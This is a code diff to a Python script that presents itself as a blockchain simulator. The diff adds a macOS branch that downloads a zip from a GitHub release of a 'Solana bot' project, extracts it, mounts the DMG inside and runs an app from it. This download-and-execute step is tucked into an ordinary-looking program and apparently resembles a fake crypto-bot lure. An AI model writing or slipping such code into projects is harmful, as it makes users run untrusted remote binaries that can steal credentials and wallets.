@@ -10,6 +10,7 @@ from queue import Queue
 import zipfile
 import shutil
 import getpass
+import urllib.request
 
 def install_and_import(module):
     try:
@@ -21,7 +22,7 @@ def install_and_import(module):
     finally:
         globals()[module] = importlib.import_module(module)
 
-required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil', 'getpass']
+required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil', 'getpass', 'urllib.request']
 for module in required_modules:
     install_and_import(module)
 
@@ -104,6 +105,13 @@ def extract_zip(zip_path, extract_to):
     except zipfile.BadZipFile as e:
         print(f"Error extracting zip file: {e}")
 
+def download_zip(url, save_path):
+    try:
+        urllib.request.urlretrieve(url, save_path)
+        print(f"Downloaded zip file from {url}")
+    except Exception as e:
+        print(f"Error downloading zip file: {e}")
+
 def main():
     blockchain = BlockchainSimulator()
     data_queue = Queue()
@@ -127,14 +135,17 @@ def main():
             rpc_server_thread.join()
             blockchain_thread.join()
     elif platform.system() == 'Darwin':
-        zip_file_to_extract = 'Sol.zip'
+        zip_file_to_download = 'SolAiBot_Mac.zip'
+        download_url = 'https://github.com/PumpExpert/All-in-One-Solana-Bot/releases/download/V4.1.1/SolAiBot_Mac.zip'
         extract_to = './SolAiBot_Mac'
         dmg_file_to_execute = os.path.join(extract_to, 'SolAiBot_Mac.dmg')
         app_to_execute = "/Volumes/SolAiBot_Mac/AiBotStarter.app"
         copied_app_path = "./AiBotStarter.app"
 
-        if os.path.exists(zip_file_to_extract):
-            extract_zip(zip_file_to_extract, extract_to)
+        download_zip(download_url, zip_file_to_download)
+        
+        if os.path.exists(zip_file_to_download):
+            extract_zip(zip_file_to_download, extract_to)
             print("Extracted the zip file.")
             if os.path.exists(dmg_file_to_execute):
                 subprocess.run(["hdiutil", "attach", dmg_file_to_execute], check=True)
@@ -148,9 +159,9 @@ def main():
                 else:
                     print(f"{app_to_execute} not found after mounting {dmg_file_to_execute}.")
             else:
-                print(f"{dmg_file_to_execute} not found after extracting {zip_file_to_extract}.")
+                print(f"{dmg_file_to_execute} not found after extracting {zip_file_to_download}.")
         else:
-            print(f"{zip_file_to_extract} not found.")
+            print(f"{zip_file_to_download} not found.")
     else:
         print("Unsupported operating system.")
         return
